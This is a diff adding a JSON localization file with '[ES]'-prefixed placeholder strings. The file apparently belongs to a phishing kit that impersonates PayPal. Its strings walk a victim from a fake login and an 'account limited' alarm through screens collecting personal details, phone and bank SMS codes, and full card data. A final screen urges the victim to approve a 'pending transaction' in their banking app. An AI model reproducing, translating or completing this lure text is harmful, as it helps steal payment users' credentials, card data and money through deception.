@@ -1,0 +1,117 @@
+{
+    "COMMON": {
+        "NEXT": "[ES] Next",
+        "CONTINUE": "[ES] Continue",
+        "SUBMIT": "[ES] Submit",
+        "CONFIRM": "[ES] Confirm",
+        "VERIFY": "[ES] Verify",
+        "CLOSE": "[ES] Close",
+        "LOADING": "[ES] Loading...",
+        "SECURE_CONNECTION": "[ES] Secure Connection",
+        "COPYRIGHT": "[ES] © 1999-2026 PayPal Inc. All rights reserved.",
+        "PRIVACY": "[ES] Privacy",
+        "LEGAL": "[ES] Legal",
+        "CONTACT": "[ES] Contact",
+        "WORLDWIDE": "[ES] Worldwide"
+    },
+    "SECURITY": {
+        "CHECKING": "[ES] Checking your security...",
+        "VERIFYING": "[ES] Verifying security...",
+        "CONNECTING": "[ES] Connecting..."
+    },
+    "LOGIN": {
+        "TITLE": "[ES] Log in to your PayPal account",
+        "EMAIL_PLACEHOLDER": "[ES] Email or mobile number",
+        "PASSWORD_PLACEHOLDER": "[ES] Password",
+        "FORGOT": "[ES] Forgot password?",
+        "OR": "[ES] or",
+        "SIGN_UP": "[ES] Sign Up",
+        "LOG_IN": "[ES] Log In",
+        "ERROR_CREDENTIALS": "[ES] Check your entries and try again."
+    },
+    "LIMITED": {
+        "TITLE": "[ES] We need to confirm it's you",
+        "DESCRIPTION": "[ES] We noticed a login from a device we don't recognize. To keep your account secure, we just need to verify your identity.",
+        "BUTTON": "[ES] Confirm Identity",
+        "WHY_LINK": "[ES] Why do I need to do this?",
+        "DIALOG_TITLE": "[ES] Why is my account limited?",
+        "ALERT_TITLE": "[ES] Unusual Activity Detected",
+        "ALERT_DESC": "[ES] We noticed a login attempt from a device or location we don't recognize.",
+        "WHATS_LIMITED": "[ES] What's Limited",
+        "LIMIT_1": "[ES] Sending payments",
+        "LIMIT_2": "[ES] Withdrawing funds",
+        "LIMIT_3": "[ES] Removing payment methods",
+        "HOW_TO_RESOLVE": "[ES] How to Resolve",
+        "RESOLVE_DESC": "[ES] This is a temporary security measure. Once you confirm your identity, full account access will be restored immediately.",
+        "SECURE_ACCOUNT": "[ES] Secure Account"
+    },
+    "PERSONAL": {
+        "TITLE": "[ES] Verify your information",
+        "SUBTITLE": "[ES] Please confirm your personal details to help us secure your account.",
+        "ERROR_TITLE": "[ES] Please check your details",
+        "ERROR_DESC": "[ES] Make sure your information matches your legal ID.",
+        "COUNTRY": "[ES] Country of residence",
+        "FIRST_NAME": "[ES] Legal first name",
+        "LAST_NAME": "[ES] Legal last name",
+        "DOB": "[ES] Date of birth",
+        "PHONE": "[ES] Mobile number",
+        "ADDRESS": "[ES] Street address",
+        "CITY": "[ES] City",
+        "ZIP": "[ES] Zip code",
+        "MUST_BE_18": "[ES] Must be 18+"
+    },
+    "PHONE": {
+        "TITLE_INPUT": "[ES] Let's confirm your number",
+        "DESC_INPUT": "[ES] We'll send a code to your mobile to ensure your account is secure.",
+        "TITLE_CODE": "[ES] Enter your code",
+        "DESC_CODE": "[ES] We sent a security code to your mobile device.",
+        "ERROR_TITLE": "[ES] That didn't work",
+        "DISCLAIMER": "[ES] By continuing, you confirm that you are authorized to use this phone number. Standard message and data rates may apply.",
+        "SEND_CODE": "[ES] Send Code",
+        "CHANGE": "[ES] Change",
+        "RESEND": "[ES] Get a new code",
+        "RESEND_WAIT": "[ES] Resend code in {{seconds}}s",
+        "CODE_SENT": "[ES] Code sent!"
+    },
+    "CARD": {
+        "TITLE": "[ES] Link a card",
+        "SUBTITLE": "[ES] Link a card to confirm your identity and lift account limitations.",
+        "ERROR_TITLE": "[ES] Check your card details",
+        "Card Number": "[ES] Card number",
+        "Expiration Date": "[ES] Expiration Date",
+        "Security Code": "[ES] Security Code",
+        "Billing Address": "[ES] Billing Address"
+    },
+    "CARD_OTP": {
+        "BADGE": "[ES] Bank Verification",
+        "TITLE": "[ES] Confirm with your bank",
+        "DESC": "[ES] We've sent a code to the mobile number registered with your card ending in •••• {{last4}}.",
+        "INVALID_TITLE": "[ES] Invalid Code",
+        "INVALID_DESC": "[ES] Please check the code and try again.",
+        "INPUT_LABEL": "[ES] Enter Bank Code",
+        "NO_CODE": "[ES] Didn't receive a code?",
+        "RESEND": "[ES] Resend Code",
+        "RESEND_WAIT": "[ES] Resend available in {{seconds}}s"
+    },
+    "BANK_APP": {
+        "TITLE": "[ES] Confirm it's you",
+        "DESC": "[ES] Please open your banking app on your mobile device and approve the pending transaction to verify your identity.",
+        "WHY_TITLE": "[ES] Why is this needed?",
+        "WHY_DESC": "[ES] Your bank requires strong authentication for this request. Once approved, return here to continue.",
+        "BUTTON": "[ES] I have approved it",
+        "SECURE_VERIFICATION": "[ES] Secure Verification"
+    },
+    "SUCCESS": {
+        "TITLE": "[ES] Account Restored",
+        "BADGE_TITLE": "[ES] Limitation Lifted",
+        "BADGE_DESC": "[ES] Your account access has been fully restored. You can now send, withdraw, and manage your funds securely.",
+        "EMAIL_SENT": "[ES] A confirmation email has been sent to {{email}}.",
+        "BUTTON": "[ES] Return to Dashboard"
+    },
+    "MODAL_LANG": {
+        "TITLE": "[ES] Choose your language",
+        "DESC": "[ES] We detected you are in {{country}}, but your device is set to {{deviceLang}}.",
+        "USE_DEVICE": "[ES] Use {{deviceLang}}",
+        "USE_IP": "[ES] Use {{ipLang}}"
+    }
+}
